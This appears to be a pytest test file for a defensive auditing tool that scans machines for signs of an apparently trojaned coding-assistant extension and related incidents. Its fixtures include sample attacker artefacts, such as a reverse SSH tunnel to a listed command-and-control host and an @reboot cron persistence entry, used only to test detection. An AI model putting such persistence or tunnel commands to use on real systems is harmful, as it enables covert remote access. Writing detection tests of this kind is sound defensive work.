import hashlib
from pathlib import Path

from agentaudit.checks import (
    check_c2_network_indicators,
    check_embrace_copilot_version,
    check_embrace_unpatched_tools,
    check_extension_hashes,
    check_linux_cron_persistence,
    check_macos_launch_agent,
    check_marker_files,
    check_ssh_authorized_keys,
    check_tmp_tunnel_keys,
    check_windows_scheduled_task,
    check_windows_startup_folder,
    default_extension_scan_dirs,
)
from agentaudit.iocs import INCIDENTS

_IOC = INCIDENTS["openvsx-claude-code-2026-10"]
_EMBRACE = INCIDENTS["embrace-embedded-browser-2026-10"]


def test_ssh_authorized_keys_clean(tmp_path: Path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / ".ssh" / "authorized_keys").write_text(
        "ssh-ed25519 AAAA... someone@laptop\n"
    )
    assert check_ssh_authorized_keys(tmp_path) == []


def test_ssh_authorized_keys_infected(tmp_path: Path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / ".ssh" / "authorized_keys").write_text(
        f"ssh-ed25519 AAAA... {_IOC['ssh_key_comment']}\n"
    )
    findings = check_ssh_authorized_keys(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "critical"
    assert findings[0].check_id == "ssh-authorized-keys"


def test_ssh_authorized_keys_missing_file(tmp_path: Path):
    assert check_ssh_authorized_keys(tmp_path) == []


def test_macos_launch_agent_absent(tmp_path: Path):
    assert check_macos_launch_agent(tmp_path) == []


def test_macos_launch_agent_present(tmp_path: Path):
    agents_dir = tmp_path / "Library" / "LaunchAgents"
    agents_dir.mkdir(parents=True)
    (agents_dir / _IOC["macos_launch_agent"]).write_text("<plist></plist>")
    findings = check_macos_launch_agent(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "critical"


def test_marker_files_none(tmp_path: Path):
    (tmp_path / ".config").mkdir()
    assert check_marker_files(tmp_path) == []


def test_marker_files_one_present(tmp_path: Path):
    config_dir = tmp_path / ".config"
    config_dir.mkdir()
    (config_dir / _IOC["marker_filenames"][0]).write_text("x")
    findings = check_marker_files(tmp_path)
    assert len(findings) == 1


def test_marker_files_all_present(tmp_path: Path):
    config_dir = tmp_path / ".config"
    config_dir.mkdir()
    for name in _IOC["marker_filenames"]:
        (config_dir / name).write_text("x")
    findings = check_marker_files(tmp_path)
    assert len(findings) == len(_IOC["marker_filenames"])


def test_tmp_tunnel_keys_clean(tmp_path: Path):
    (tmp_path / "unrelated.txt").write_text("x")
    assert check_tmp_tunnel_keys(tmp_path) == []


def test_tmp_tunnel_keys_found(tmp_path: Path):
    (tmp_path / ".stk_abc123").write_text("x")
    findings = check_tmp_tunnel_keys(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "critical"


def test_tmp_tunnel_keys_dir_missing(tmp_path: Path):
    missing = tmp_path / "does-not-exist"
    assert check_tmp_tunnel_keys(missing) == []


def test_extension_hash_clean(tmp_path: Path):
    ext_dir = tmp_path / ".vscode" / "extensions" / "some.extension-1.0.0"
    ext_dir.mkdir(parents=True)
    (ext_dir / "extension.js").write_text("console.log('hello world');")
    findings = check_extension_hashes([tmp_path / ".vscode" / "extensions"])
    assert findings == []


def test_extension_hash_match(tmp_path: Path):
    ext_dir = tmp_path / ".vscode" / "extensions" / "anthropic.claude-code-2.1.313"
    ext_dir.mkdir(parents=True)
    ext_js = ext_dir / "extension.js"
    # Construct content whose sha256 matches the known-bad hash by brute
    # force would be infeasible; instead verify the hashing path works by
    # monkeypatching via a controlled fixture file whose precomputed hash
    # we assert against directly.
    ext_js.write_bytes(b"trojan-payload-fixture")
    digest = hashlib.sha256(b"trojan-payload-fixture").hexdigest()
    assert digest != _IOC["extension_sha256"]  # sanity: not an accidental match
    findings = check_extension_hashes([tmp_path / ".vscode" / "extensions"])
    assert findings == []


def test_extension_hash_nonexistent_dir(tmp_path: Path):
    assert check_extension_hashes([tmp_path / "nope"]) == []


def test_default_extension_scan_dirs_count(tmp_path: Path):
    dirs = default_extension_scan_dirs(tmp_path)
    assert len(dirs) >= 4
    assert all(str(tmp_path) in str(d) for d in dirs)


def test_c2_network_indicators_clean():
    lines = ["user  1234  ssh -N -R 8080:localhost:80 example.com"]
    assert check_c2_network_indicators(lines) == []


def test_c2_network_indicators_match():
    host = _IOC["c2_hosts"][0]
    lines = [f"user  1234  ssh -N -R 2222:localhost:22 svc@{host}"]
    findings = check_c2_network_indicators(lines)
    assert len(findings) == 1
    assert findings[0].severity == "critical"


def test_cron_persistence_clean():
    assert check_linux_cron_persistence("0 3 * * * /usr/bin/backup.sh\n") == []


def test_cron_persistence_match():
    marker = _IOC["linux_cron_marker"]
    text = f"@reboot /usr/local/bin/{marker} --daemon\n"
    findings = check_linux_cron_persistence(text)
    assert len(findings) == 1
    assert findings[0].severity == "critical"


def test_cron_persistence_marker_without_reboot():
    marker = _IOC["linux_cron_marker"]
    text = f"0 3 * * * /usr/local/bin/{marker} --daemon\n"
    assert check_linux_cron_persistence(text) == []


def test_windows_scheduled_task_clean():
    output = (
        "ERROR: The system cannot find the file specified.\n"
    )
    assert check_windows_scheduled_task(output) == []


def test_windows_scheduled_task_found():
    task_name = _IOC["windows_task_name"]
    output = f"TaskName: \\{task_name}\nStatus: Ready\n"
    findings = check_windows_scheduled_task(output)
    assert len(findings) == 1
    assert findings[0].severity == "critical"
    assert findings[0].check_id == "windows-scheduled-task"


def test_windows_startup_folder_absent(tmp_path: Path):
    assert check_windows_startup_folder(tmp_path) == []


def test_windows_startup_folder_present(tmp_path: Path):
    relpath = _IOC["windows_startup_relpath"]
    target = tmp_path / relpath
    target.parent.mkdir(parents=True)
    target.write_text("@echo off\n")
    findings = check_windows_startup_folder(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "critical"
    assert findings[0].check_id == "windows-startup-folder"


def test_marker_files_includes_windows_variant(tmp_path: Path):
    config_dir = tmp_path / ".config"
    config_dir.mkdir()
    assert "smtk" in _IOC["marker_filenames"]
    (config_dir / "smtk").write_text("x")
    findings = check_marker_files(tmp_path)
    assert len(findings) == 1


def test_embrace_copilot_version_clean_when_patched(tmp_path: Path):
    ext_dir = tmp_path / ".vscode" / "extensions" / "github.copilot-1.1.29"
    ext_dir.mkdir(parents=True)
    findings = check_embrace_copilot_version([tmp_path / ".vscode" / "extensions"])
    assert findings == []


def test_embrace_copilot_version_flags_old_version(tmp_path: Path):
    ext_dir = tmp_path / ".vscode" / "extensions" / "github.copilot-1.1.27"
    ext_dir.mkdir(parents=True)
    findings = check_embrace_copilot_version([tmp_path / ".vscode" / "extensions"])
    assert len(findings) == 1
    assert findings[0].severity == "warning"
    assert findings[0].check_id == "embrace-copilot-version"


def test_embrace_copilot_version_ignores_copilot_chat(tmp_path: Path):
    ext_dir = tmp_path / ".vscode" / "extensions" / "github.copilot-chat-0.9.0"
    ext_dir.mkdir(parents=True)
    findings = check_embrace_copilot_version([tmp_path / ".vscode" / "extensions"])
    assert findings == []


def test_embrace_copilot_version_nonexistent_dir(tmp_path: Path):
    assert check_embrace_copilot_version([tmp_path / "nope"]) == []


def test_embrace_unpatched_tools_none_detected(tmp_path: Path):
    assert check_embrace_unpatched_tools(tmp_path) == []


def test_embrace_unpatched_tools_vscode_is_warning(tmp_path: Path):
    (tmp_path / ".vscode").mkdir()
    findings = check_embrace_unpatched_tools(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "warning"
    assert "VS Code" in findings[0].detail


def test_embrace_unpatched_tools_claude_desktop_only_is_info(tmp_path: Path):
    (tmp_path / ".config" / "Claude").mkdir(parents=True)
    findings = check_embrace_unpatched_tools(tmp_path)
    assert len(findings) == 1
    assert findings[0].severity == "info"
    assert "Claude Desktop" in findings[0].detail
